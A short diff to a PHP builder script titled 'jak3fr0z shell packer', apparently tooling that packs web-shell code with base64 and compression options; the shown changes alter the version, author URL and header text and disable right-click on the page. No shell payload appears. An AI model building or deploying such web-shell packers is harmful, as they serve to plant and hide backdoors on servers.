@@ -1,13 +1,13 @@
 <?php
 /*
-	jak3fr0z shell
+	jak3fr0z
 	Jake Tancinco
 	(c)2016
-	https://github.com/PhilCodeEx/jak3fr0z
+	https://github.com/PhilCodex/jak3fr0z
 
 */
 $GLOBALS['packer']['title'] = "jak3fr0z shell packer";
-$GLOBALS['packer']['version'] = "1.2.0";
+$GLOBALS['packer']['version'] = "1.4.3";
 $GLOBALS['packer']['base_dir'] = "./base/";
 $GLOBALS['packer']['module_dir'] = "./module/";
 $GLOBALS['packer']['theme_dir'] = "./theme/";
@@ -135,7 +135,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 	}
 	</style>
 	</head>
-	<body>
+	<body oncontextmenu="return false">
 
 	<div id='wrapper' style='padding:12px'>
 		<div id='devTitle' class='border'><?php echo $GLOBALS['packer']['title']." ".$GLOBALS['packer']['version'];?></div>
@@ -516,10 +516,10 @@ function packer_jak3fr0z($output, $phpcode, $htmlcode, $strip, $base64, $compres
 	
 	$header = "<?php
 /*
-	jak3fr0z shell ".$version."
+	jak3fr0zshell ".$version."
 	Jake Tancinco
 	(c)".@date("Y",time())."
-	https://github.com/PhilCodeEx/jak3fr0z
+	https://github.com/PhilCodEx/jak3fr0z
 
 */\n";
 
